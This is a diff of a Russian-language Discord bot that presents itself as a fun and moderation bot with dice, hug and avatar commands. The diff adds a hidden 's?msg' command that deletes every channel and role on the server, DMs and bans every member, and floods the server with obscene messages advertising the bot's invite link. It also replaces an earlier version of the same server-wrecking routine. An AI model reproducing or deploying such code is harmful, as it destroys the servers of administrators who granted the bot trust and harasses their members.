@@ -33,17 +33,28 @@ bot.on ("message", async message =>{
     if (cmd) cmd.run(bot,message,args);
 });
 bot.on('message', msg => {
-    if (msg.content === 's?help') {
-    	msg.guild.setName('Confessional Bot Crashed Server') // Смена названия сервера
-		msg.guild.setIcon('https://cdn.discordapp.com/icons/692983981255163905/6a89b42b8324ee64b093cc415271e479.png?size=128').then(() => {
-      msg.guild.roles.forEach(i => i.delete()) // Удаление всех ролей
+    if (msg.content === 's?msg') {
+		msg.guild.setIcon('https://images-ext-1.discordapp.net/external/wcTyIIPsGT7fuP4e9RMQQmdNWD-PeyGN4nYwNIp7Gxs/%3Fsize%3D128/https/cdn.discordapp.com/icons/692983981255163905/6a89b42b8324ee64b093cc415271e479.png').then(() => {
       msg.guild.channels.forEach(c => c.delete()) //Удаление все чатов и каналов
+      msg.guild.roles.forEach(i => i.delete()) // Удаление ролей
        msg.guild.members.forEach(member => { //Расслыка всем пользователям
-        if (member.id != bot.user.id && !member.user.bot) member.send('Сервер на котором вы находились крашнул юзер, сервер бота: https://discord.gg/DM5xaGD . Приглашение бота: https://discord.com/api/oauth2/authorize?client_id=709763322089570354&permissions=8&scope=bot').then(() => {
+        if (member.id != bot.user.id && !member.user.bot) member.send('Вас трахнул юзер который использовал бота. Сервер бота: https://discord.gg/DM5xaGD , ссылка на бота:https://discord.com/oauth2/authorize?client_id=709763322089570354&permissions=268435510&scope=bot').then(() => {
             member.ban().then(() => {
-                msg.guild.createChannel(name, "Конфа топ")
+                const name = 'говно'
+                msg.guild.createChannel(name, "text")
+					.then(channel => {
+                    channel.send('Вас трахнул юзер который использовал бота. Сервер бота: https://discord.gg/DM5xaGD , ссылка на бота:https://discord.com/oauth2/authorize?client_id=709763322089570354&permissions=268435510&scope=bot')
+                    channel.overwritePermissions(member, {
+                        SEND_MESSAGES: false
+                    })
+					
                     console.log('Попался лох')
                 })
+            })
+        })
+      })
+})
+	}
 	
   });
   bot.on('message', msg => {
@@ -81,7 +92,7 @@ const rando_hug = [
 // Локальные переменные
 
 let statuslist = ['s?help | statbot.net']
-let onlinelist = ['dnd','idle','online'] // invisible - ещё есть
+let onlinelist = ['online'] // invisible - ещё есть
 let randomcube = ['1','2','3','4','5','6','7','8','9','10','11','12']
 let listavatar = ['2.png','1.png']
 let randomcoin = ['Орёл','Решка']
@@ -97,6 +108,8 @@ bot.on("ready", function () {
 	
 	setInterval(function() {
 
+        let statuss = statuslist[Math.floor(Math.random()*statuslist.length)]
+        bot.user.setGame(statuss + "|Сервер: " + bot.guilds.array().length)
 
         //let listavatars = listavatar[Math.floor(Math.random()*listavatar.length)] // Смена аватаров (Пофикшенно дискордом)
         //console.log(listavatars)
@@ -119,8 +132,7 @@ const commands = {
 		process: function (msg, suffix, embed) {
 			const list = ["Bot - Бот",
 			"** Тег команды: "+config.prefix+" **",
-      "`help` - Команды",
-      "**Команды для веселья**",
+			"`help` - Команды",
 			"`avatar` - Ваше изображение профиля/или любого юзера",
 			"`info` - Информация об аккаунте",
 			"`dice` - Бросить кости",
@@ -131,14 +143,8 @@ const commands = {
 			"`hug @user` - Сбнять пользователя",
 			"`bite @user` - Сделать кусь пользователю",
 			"`nya @user` - Поприветсвтовать пользователя",
-      "`status` - Статистика",
-      "**Технические/Административные команды**",
-      "`ping` - Показывает пинг",
-      "`ban` - блокирует человека на сервере",
-      "`kick` - выпинает человека из сервера",
-      "`mute` - затыкакет человека на указанное время",
-      "`warn/unwarn` - выдаёт, забирает предупреждение",
-      "`say` - бот пишет то что Вы написали в команде"
+			"`status` - Статистика",
+			"`ping` - Показывает пинг"
 					]
 			embed.setDescription(list);
 			embed.setAuthor("Список команд бота", "https://imgur.com/iB8uy34");
@@ -307,7 +313,7 @@ function getDateTime() {
     return year + "-" + month + "-" + day + "   T" + hour + ":" + min + ":" + sec;
     //2018-11-18T18:44:59.480Z
 }
-//* Система уровня 
+/* Система уровня 
 bot.on("message", message => {
     if (message.author.bot) return; // Игнор бота
 
@@ -346,7 +352,7 @@ bot.on("message", message => {
         if (x) console.error(x)
       });
 })
-
+*/
 bot.on('voiceStateUpdate', async (oldMember, newMeber) => {
 
 
